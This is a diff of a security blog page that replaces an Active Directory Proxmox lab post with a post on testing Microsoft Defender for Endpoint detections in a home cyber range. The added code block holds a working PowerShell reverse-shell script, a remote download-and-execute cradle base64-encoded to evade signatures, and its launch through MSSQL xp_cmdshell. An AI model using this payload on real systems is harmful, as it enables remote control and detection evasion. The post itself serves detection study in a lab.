@@ -9,26 +9,26 @@
     <meta name="generator" content="Retype 3.11.0">
 
     <!-- Primary Meta Tags -->
-    <title>Active Directory Home Lab with Proxmox - Part 2</title>
-    <meta name="title" content="Active Directory Home Lab with Proxmox - Part 2">
-    <meta name="description" content="In this post, we're diving into the setup of Windows virtual machines (VMs) in a Proxmox home lab, with the ultimate goal of building an Active...">
+    <title>Adding Endpoint Detection to our Cyber Range</title>
+    <meta name="title" content="Adding Endpoint Detection to our Cyber Range">
+    <meta name="description" content="As a security analyst, you will likely come in contact with Antivirus, SIEMs, EDR, XDR and Cloud products.">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://bytebl33d.github.io/blog/proxmox-homelab-part2/">
+    <link rel="canonical" href="https://bytebl33d.github.io/blog/endpoint-detection-lab/">
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://bytebl33d.github.io/blog/proxmox-homelab-part2/">
-    <meta property="og:title" content="Active Directory Home Lab with Proxmox - Part 2">
-    <meta property="og:description" content="In this post, we're diving into the setup of Windows virtual machines (VMs) in a Proxmox home lab, with the ultimate goal of building an Active...">
-    <meta property="og:image" content="https://bytebl33d.github.io/assets/images/headers/ad-banner.jpg">
+    <meta property="og:url" content="https://bytebl33d.github.io/blog/endpoint-detection-lab/">
+    <meta property="og:title" content="Adding Endpoint Detection to our Cyber Range">
+    <meta property="og:description" content="As a security analyst, you will likely come in contact with Antivirus, SIEMs, EDR, XDR and Cloud products.">
+    <meta property="og:image" content="https://bytebl33d.github.io/assets/images/homelab/mde-license.png">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://bytebl33d.github.io/blog/proxmox-homelab-part2/">
-    <meta property="twitter:title" content="Active Directory Home Lab with Proxmox - Part 2">
-    <meta property="twitter:description" content="In this post, we're diving into the setup of Windows virtual machines (VMs) in a Proxmox home lab, with the ultimate goal of building an Active...">
-    <meta property="twitter:image" content="https://bytebl33d.github.io/assets/images/headers/ad-banner.jpg">
+    <meta property="twitter:url" content="https://bytebl33d.github.io/blog/endpoint-detection-lab/">
+    <meta property="twitter:title" content="Adding Endpoint Detection to our Cyber Range">
+    <meta property="twitter:description" content="As a security analyst, you will likely come in contact with Antivirus, SIEMs, EDR, XDR and Cloud products.">
+    <meta property="twitter:image" content="https://bytebl33d.github.io/assets/images/homelab/mde-license.png">
 
     <!-- RSS -->
     <link rel="alternate" type="application/rss+xml" title="Blog >> Feed" href="https://bytebl33d.github.io/blog/feed.xml">
@@ -40,6 +40,7 @@
     <script data-cfasync="false" src="../../resources/js/config.js?v=3.11.0.820757927220" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
     <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.11.0.820757927220" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.11.0.820757927220" defer></script>
 </head>
 <body>
     <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
@@ -173,10 +174,10 @@
                             <!-- Rendered if sidebar right is enabled -->
                             <div id="retype-sidebar-right-toggle"></div>
                             <!-- Page content  -->
-<doc-anchor-target id="active-directory-home-lab-with-proxmox---part-2" class="break-words">
+<doc-anchor-target id="adding-endpoint-detection-to-our-cyber-range" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#active-directory-home-lab-with-proxmox---part-2">#</doc-anchor-trigger>
-        <span>Active Directory Home Lab with Proxmox - Part 2</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#adding-endpoint-detection-to-our-cyber-range">#</doc-anchor-trigger>
+        <span>Adding Endpoint Detection to our Cyber Range</span>
     </h1>
 </doc-anchor-target>
 <div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center print:justify-center">
@@ -184,27 +185,103 @@
     <div><a href="../../categories/active-directory/">Active-Directory</a>,&nbsp;</div>
     <div><a href="../../categories/homelab/">Homelab</a></div>
     <div class="mx-2">&#9679;</div>
-    <div class="flex items-center shrink-0">Published&nbsp;<span>2024-03-27</span></div>
+    <div class="flex items-center shrink-0">Published&nbsp;<span>2025-11-22</span></div>
 </div>
 
+<p>As a security analyst, you will likely come in contact with Antivirus, SIEMs, EDR, XDR and Cloud products. To better understand these products it is beneficial to create your own detection lab. In this post, I will go over the practical steps to improve my current lab setup to add Microsoft Defender for Endpoint as our EDR solution.</p>
+<doc-anchor-target id="setting-up-mde">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#setting-up-mde">#</doc-anchor-trigger>
+        <span>Setting Up MDE</span>
+    </h2>
+</doc-anchor-target>
+<p>Microsoft Defender for Endpoint is a comprehensive endpoint security solution that helps protect enterprise networks from advanced threats. Setting up a home lab for Microsoft Defender for Endpoint allows individuals to gain hands-on experience in deploying, configuring, and managing this powerful security tool in a simulated environment. Onboarding your devices with MDE enables you to identify and stop threats quickly, prioritize risks, and evolve your defenses across operating systems and network devices.</p>
+<p>In order to onboard devices with MDE, you need to have a tenant in <a href="https://learn.microsoft.com/en-us/entra/identity-platform/quickstart-create-new-tenant">Microsoft Entra</a>. In case you already have an active tenant (e.g. <code v-pre>&lt;tenant-name&gt;.onmicrosoft.com</code>), we can activate a MDE license in the <a href="https://admin.microsoft.com/Adminportal/">Microsoft 365 admin center</a>. In the navigation pane, expand <strong>Billing</strong>, and select <strong>Your products</strong>. I chose for the Defender for Endpoint Plan 2 as it includes full EDR features, advanced hunting, automatic investigations and remediations, automatic attack disruption and live response.</p>
 <p><figure class="content-center">
-    <img src="../../assets/images/headers/ad-banner.jpg" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <img src="../../assets/images/homelab/mde-license.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<p>In this post, we&#x27;re diving into the setup of Windows virtual machines (VMs) in a Proxmox home lab, with the ultimate goal of building an Active Directory (AD) environment. This includes creating a Domain Controller that will also serve as the DHCP server for our AD Lab, and joining a Windows 10 host to the domain. By the end of this guide, you&#x27;ll have a functional AD lab that you can use for learning, experimenting, and testing.</p>
-<doc-anchor-target id="what-youll-need">
+<doc-anchor-target id="onboarding-devices">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#what-youll-need">#</doc-anchor-trigger>
-        <span>What You&#x27;ll Need</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#onboarding-devices">#</doc-anchor-trigger>
+        <span>Onboarding Devices</span>
     </h2>
 </doc-anchor-target>
-<p>To get started with setting up your Windows VMs and creating the AD Lab, make sure you have the following:</p>
-<ul>
-<li><a href="https://pve.proxmox.com/wiki/Windows_VirtIO_Drivers">Windows VirtIO Drivers</a>: Necessary for better performance and compatibility of Windows VMs in Proxmox.</li>
-<li><a href="https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022">Windows Server 2022 ISO</a>: For setting up the Domain Controller.</li>
-<li><a href="https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise">Windows 10 Enterprise Evaluation ISO</a>: For joining a client machine to the domain.</li>
-</ul>
+<p>Once your license has been activated, you should have a new section on the <a href="https://security.microsoft.com">Microsoft Defender portal</a> to manage your devices. At the moment it will look quite empty.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/mde-device-inventory.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Go ahead and click on <strong>Onboard devices</strong>, which should bring you to a page to download onboarding packages for each device type. For my first device, I will select the <strong>Windows Server 2019, 2022, and 2025</strong> package, and choose the streamlined local script deployment.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/mde-device-onboarding-package.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We can then run the onboarding script on one of our servers. And yes I know it is quite ironic, but I used Evil-WinRM to onboard my device. A subtle reminder that even “evil” tools can have a redemption arc.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/mde-onboard.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>After running the script, we should have a new device showing up in our inventory.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/mde-device-onboarded.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="making-device-groups">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#making-device-groups">#</doc-anchor-trigger>
+        <span>Making Device Groups</span>
+    </h2>
+</doc-anchor-target>
+<p>Before we continue and try to execute any attacks, lets first make a new <strong>device group</strong> for our lab so that we can configure how we want automated investigation and remediation to proceed. Since we are testing the automated response capabilities, I want to always require approval before remediation. On the <strong>Settings</strong> page, under <strong>Permissions</strong>, select <strong>Device groups</strong> and add a new device group.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/mde-device-group.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Then under the Devices section, I made a rule to match all endpoints that end with the domain &quot;ninja.lan&quot;, which is one of the Ludus ranges we build in a <a href="../ludus-cyber-range/">previous blog post</a>. Since we are testing the detection capabilities of our future attacks, I set the automation level to &quot;No automated response&quot;.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/mde-automated-response.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="testing-detection-capabilities">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#testing-detection-capabilities">#</doc-anchor-trigger>
+        <span>Testing Detection Capabilities</span>
+    </h2>
+</doc-anchor-target>
+<p>For the attack scenario, my lab includes a MSSQL Server. Suppose for this scenario, we gained access to the database as the <code v-pre>sa</code> user. Let&#x27;s execute a simple command with the <code v-pre>xp_cmdshell</code> stored procedure.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/mde-xp_cmdshell.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>In this case, the database is running as <code v-pre>NT AUTHORITY\Network Service</code>. Over in Microsoft Defender for Endpoint, we can see the corresponding process creation event:</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/mde-xp_cmdshell-log.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>At this point, nothing is particularly suspicious. We’re technically just using built-in MSSQL functionality. So MDE has not created any alerts just yet. Let&#x27;s step it up a notch and try to run a few more commands.</p>
+<p>Since we’re running as a service account, we often inherit <em>spicy</em> local privileges that pair very nicely with classic Potato attacks. So naturally, the next logical move is to try uploading a Netcat binary to the target, because subtlety is overrated.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/mde-nc.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>As expected, this attempt gets <strong>immediately nuked</strong> by MDE. The binary is signatured, Defender clocked it instantly, and the dream is over before it even started.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/mde-nc-incident.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Let’s pivot to something a little more stealthy and use a custom reverse PowerShell cradle.</p>
 <div class="flex mb-6">
     <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-info"></div>
     <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
@@ -218,118 +295,39 @@
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-            <h5>Note</h5>
-<p>The ISOs typically have a lifespan of 90 to 180 days, but they can often be extended. To be safe, consider taking a snapshot of your VMs right after installation to revert back if needed.</p>
+<p>This PowerShell cradle is a small adaptation to one of the public cradles on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadAllTheThings</a> to avoid signature detections.</p>
         </div>
     </div>
 </div>
-<doc-anchor-target id="setting-up-the-ad-lab">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#setting-up-the-ad-lab">#</doc-anchor-trigger>
-        <span>Setting Up the AD Lab</span>
-    </h2>
-</doc-anchor-target>
-<p>We&#x27;ll start by uploading the necessary ISOs to our Proxmox server. For this guide, we&#x27;ll create two VMs: a Windows 10 machine and a Domain Controller. Since the setup for both is quite similar, we&#x27;ll focus on the Domain Controller.</p>
-<doc-anchor-target id="step-1-create-the-domain-controller-vm">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#step-1-create-the-domain-controller-vm">#</doc-anchor-trigger>
-        <span>Step 1: Create the Domain Controller VM</span>
-    </h3>
-</doc-anchor-target>
-<p>Create a new Virtual Machine and select the Windows Server 2022 ISO image you downloaded. Check the box to add an additional drive for the VirtIO drivers and select the corresponding ISO image.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ echo &quot;$c = New-Object System.Net.Sockets.TCPClient('192.168.1.100',443);$s = $c.GetStream();[byte[]]$byt = 0..65535|%{0};while(($i = $s.Read($byt,0,$byt.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($byt,0,$i);$sb = (iex $data 2&gt;&amp;1 | Out-String);$sb2 = $sb + 'PS ' + '&gt; ';$sby = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()&quot; &gt; a.ps1
+
+$ echo &quot;iwr -uri http://192.168.1.100:8000/a.ps1 -UseBasicParsing | iex&quot; &gt; cradle
+$ cat cradle | iconv -t utf-16le | base64 -w 0
+aQB3AHIAIAAtAHUAcgBpACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAwADoAOAAwADAAMAAvAGEALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAB8ACAAaQBlAHgACgA=
+
+SQL (sa  dbo@master)&gt; xp_cmdshell &quot;powershell.exe -enc aQB3AHIAIAAtAHUAcgBpACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAwADoAOAAwADAAMAAvAGEALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAB8ACAAaQBlAHgACgA=&quot;</code></pre>
+</doc-codeblock></div>
 <p><figure class="content-center">
-    <img src="../../assets/images/homelab/dc-setup.png" alt="DC-Setup" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">DC-Setup</figcaption>
+    <img src="../../assets/images/homelab/mde-revshell.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<p>Enable the &quot;Qemu Agent&quot; in the system tab and use the following configuration for the disks.</p>
+<p>And just like that we got a reverse shell without being blocked by MDE. While Defender didn’t stop the execution, it definitely noticed the behavior. Sure enough, we can see the resulting alerts and telemetry in the Defender portal:</p>
 <p><figure class="content-center">
-    <img src="../../assets/images/homelab/dc-setup-1.png" alt="DC-Setup-1" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">DC-Setup-1</figcaption>
+    <img src="../../assets/images/homelab/mde-revshell-logs.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<p>It&#x27;s recommended to assign at least 8GB of RAM and 2 CPU cores. Skip through the remaining settings, and ensure you select <code v-pre>vmbr3</code> as the network interface bridge (AD LAB).</p>
-<p><figure class="content-center">
-    <img src="../../assets/images/homelab/dc-setup-2.png" alt="DC-Setup-2" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">DC-Setup-2</figcaption>
-</figure>
-</p>
-<p>Start the VM and press enter to go into the installation process. Begin the installation process by choosing the Windows Server 2022 Standard Evaluation (Desktop Experience) as the operating system. Proceed with the custom installation.</p>
-<p><figure class="content-center">
-    <img src="../../assets/images/homelab/dc-setup-3.png" alt="DC-Setup-3" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">DC-Setup-3</figcaption>
-</figure>
-</p>
-<p>Follow the installer steps until you reach the installation step where you need to select the location to install Windows Server. Click &quot;Load driver&quot; to install the VirtIO drivers for hard disk and the network. Browse to the CD drive where you mounted the VirtIO driver and select folder <code v-pre>vioscsi\2k22\amd64</code> and confirm. Select the &quot;Red Hat VirtIO SCSI pass-through controller&quot; and click next to install it. Repeat this for the <code v-pre>NetKVM\2k22\amd64</code> and <code v-pre>Balloon\2k22\amd64</code> folders.</p>
-<p><figure class="content-center">
-    <img src="../../assets/images/homelab/dc-setup-3.1.png" alt="DC-Setup-3.1" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">DC-Setup-3.1</figcaption>
-</figure>
-</p>
-<p>The first thing to do after the first boot is to rename the computer. Go to <code v-pre>Settings &gt; System &gt; About &gt; Rename This PC</code>. I renamed mine to <code v-pre>DC01</code> and chose to restart later.</p>
-<p>Since this machine will serve as the DHCP server, it needs a static IP. Go to <code v-pre>Control Panel &gt; Network and Internet &gt; Network and Sharing Center &gt; Change Adapter Settings</code>, and configure the network interface with a private IP address (e.g., <code v-pre>172.16.200.100</code>). Set the DNS server to <code v-pre>127.0.0.1</code>, since the DC will also be a DNS server.</p>
-<p><figure class="content-center">
-    <img src="../../assets/images/homelab/dc-setup-4.png" alt="DC-Setup-4" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">DC-Setup-4</figcaption>
-</figure>
-</p>
-<doc-anchor-target id="step-2-install-active-directory-domain-services">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#step-2-install-active-directory-domain-services">#</doc-anchor-trigger>
-        <span>Step 2: Install Active Directory Domain Services</span>
-    </h3>
-</doc-anchor-target>
-<p>Open Server Manager and select <code v-pre>Add roles and features</code>. Accept the default settings until you&#x27;re prompted with the <code v-pre>Server Roles</code> section. Select <code v-pre>Active Directory Domain Services</code> and add the necessary features. Once it has installed successfully, select <code v-pre>Close</code>. I also installed the DNS and DHCP Server Features together with Active Directory Certificate Services, but this is optional.</p>
-<p><figure class="content-center">
-    <img src="../../assets/images/homelab/dc-setup-ad-services.gif" alt="DC-Setup-ad-services" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">DC-Setup-ad-services</figcaption>
-</figure>
-</p>
-<p>The next step is to promote the server to a domain controller. You will need to have the domain name you want to use in the next step. I will choose the domain name of <code v-pre>cicada.local</code>. To promote the server to a domain controller, click on the notification icon on the top section of the Server Manager program. Then select <code v-pre>Promote this server to a domain controller</code>. Select <code v-pre>Add a new forest</code> as this is a newly created AD environment. Enter the domain name in the root domain name field. Once the Windows Server has rebooted, you will see the login screen show the domain entered in the previous step.</p>
-<doc-anchor-target id="step-3-create-a-domain-admin-account">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#step-3-create-a-domain-admin-account">#</doc-anchor-trigger>
-        <span>Step 3: Create a Domain Admin Account</span>
-    </h3>
-</doc-anchor-target>
-<p>After logging in, open <code v-pre>Active Directory Users and Computers</code>. As I like to keep things organized, I will create a new group for all the user accounts. Right click on your domain and select <code v-pre>New &gt; Organizational Unit</code> and name it <code v-pre>Groups</code>. Move all group related objects from the <code v-pre>Users</code> to the <code v-pre>Groups</code> folder. Right click on the <code v-pre>Users</code> folder and select <code v-pre>New &gt; User</code>.</p>
-<p><figure class="content-center">
-    <img src="../../assets/images/homelab/dc-setup-5.png" alt="DC-Setup-5" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">DC-Setup-5</figcaption>
-</figure>
-</p>
-<p>Fill in the user details and set a password for the account. Disable the option <code v-pre>User must change password at next logon</code> and check the <code v-pre>Password never expires</code>. In an organization, the former should be checked so that the end user can set their own password.</p>
-<p>Now we need to add the newly created account to the <code v-pre>Domain Admin</code> group. This can be done right clicking the newly created user and selecting Properties. Select the <code v-pre>Member of &gt; Add</code>. Under the <code v-pre>Enter the object names to select</code> section, click on the <code v-pre>Advanced</code> button. Then click <code v-pre>Find now &gt; Domain Admins</code> and click <code v-pre>OK</code>.</p>
-<p>We can then logout of the Administrator account and login with our newly created domain account. Whenever we create a new user account, they are able to login with their credentials on any domain joined host.</p>
-<doc-anchor-target id="step-4-configure-the-dhcp-server">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#step-4-configure-the-dhcp-server">#</doc-anchor-trigger>
-        <span>Step 4: Configure the DHCP Server</span>
-    </h3>
-</doc-anchor-target>
-<p>Go to <code v-pre>Server Manager &gt; Add roles and Features</code>, select DHCP Server, and complete the installation. Once done, complete the DHCP configuration through the notifications in Server Manager.</p>
-<p>We then have to configure a DHCP scope. To do so, go to <code v-pre>Server Manager</code> once again. Then select <code v-pre>Tools &gt; DHCP</code>. Expand the available options and then right click on IPv4 to create an IPv4 Scope. Set a name for the scope and give it a description if you wish to do so. Select <code v-pre>Next</code> and set the range to be somewhere inside the <code v-pre>172.16.200.1/24</code> network. I choose the starting IP to be <code v-pre>172.16.200.11</code> to give me some room in case I want to add some static IPs later. You can also exclude some IP addresses if you want to.</p>
-<p><figure class="content-center">
-    <img src="../../assets/images/homelab/dc-setup-6.png" alt="DC-Setup-6" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">DC-Setup-6</figcaption>
-</figure>
-</p>
-<p>When prompted if you want to configure DHCP options for this scope now, choose <code v-pre>Yes</code>, then select <code v-pre>Next</code>. You will then be prompted to select the IP address for the default gateway. The IP address we gave our default gateway was <code v-pre>172.16.200.1</code>. Enter that and click on Add. Then select Next.</p>
-<doc-anchor-target id="add-windows-10-vm-to-domain">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#add-windows-10-vm-to-domain">#</doc-anchor-trigger>
-        <span>Add Windows 10 VM to Domain</span>
-    </h3>
-</doc-anchor-target>
-<p>Go through the initial setup wizard and login with the local account you created. The next step is to join the Windows 10 VM to the domain. To do so, open the <code v-pre>Settings</code> program and go to <code v-pre>Accounts &gt; Access work or school &gt; Connect</code>. In the pop out window, select the option <code v-pre>Join this device to a local Active Directory domain</code>. Enter the domain name we used to configure our Active Directory forest (I used cicada.local). You will then be prompted for a login.</p>
-<p>Windows 10 will restart after entering the credentials. After rebooting, you can now login to the domain by selecting Other User in the lower left corner.</p>
 <doc-anchor-target id="conclusion">
     <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#conclusion">#</doc-anchor-trigger>
         <span>Conclusion</span>
     </h2>
 </doc-anchor-target>
-<p>Congratulations! You now have a fully functioning Active Directory home lab. With your Domain Controller and Windows 10 VM set up, you’re ready to explore, experiment, and even simulate attacks to understand how AD environments operate and how they can be secured or compromised. In the next part, we’ll delve into common misconfigurations in Windows and Active Directory and explore how attackers might exploit them. Stay tuned!</p>
+<p>Microsoft Defender for Endpoint is undeniably a strong security product. As demonstrated, it is highly effective at detecting and outright blocking known threats, particularly those that rely on well-known tooling, static signatures and behavioral analysis. However, as this lab also shows, detection does not always equate to prevention. When attackers adapt their techniques and move toward custom or living-off-the-land approaches, MDE may allow execution while still generating telemetry and alerts.</p>
+<p>This highlights an important takeaway: MDE is not a silver bullet. With sufficient adaptation, creativity, and an understanding of how detections work, it is entirely possible to bypass certain protections. That does not make MDE ineffective, it simply reinforces the reality that endpoint security is an ongoing cat-and-mouse game rather than a solved problem.</p>
+<p>In a future post, I will take this a step further and explore how Microsoft Defender for Endpoint can be bypassed using a custom Sliver stager, focusing on evasion techniques and the resulting detection artifacts.</p>
 
                             
                             <!-- Required only on API pages -->
@@ -339,20 +337,13 @@
                         
                             <nav id="retype-nextprev" class="print:hidden flex mt-14">
                                 <div class="w-1/2">
-                                    <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../blog/proxmox-homelab-part3/">
-                                        <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
-                                        <span>
-                                            <span class="block text-xs font-normal text-base-text-muted">Newer</span>
-                                            <span class="block mt-1">Active Directory Home Lab with Proxmox - Part 3</span>
-                                        </span>
-                                    </a>
                                 </div>
                         
                                 <div class="w-1/2">
-                                    <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../blog/proxmox-homelab-part1/">
+                                    <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../blog/ludus-cyber-range/">
                                         <span>
                                             <span class="block text-xs font-normal text-right text-base-text-muted">Older</span>
-                                            <span class="block mt-1">Active Directory Home Lab with Proxmox - Part 1</span>
+                                            <span class="block mt-1">Building a Cyber Range with Ludus</span>
                                         </span>
                                         <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                     </a>
@@ -393,6 +384,6 @@
 
     <div id="retype-overlay-target"></div>
 
-    <script data-cfasync="false">window.__DOCS__ = { "title": "Active Directory Home Lab with Proxmox - Part 2", level: 2, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Adding Endpoint Detection to our Cyber Range", level: 2, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
 </html>
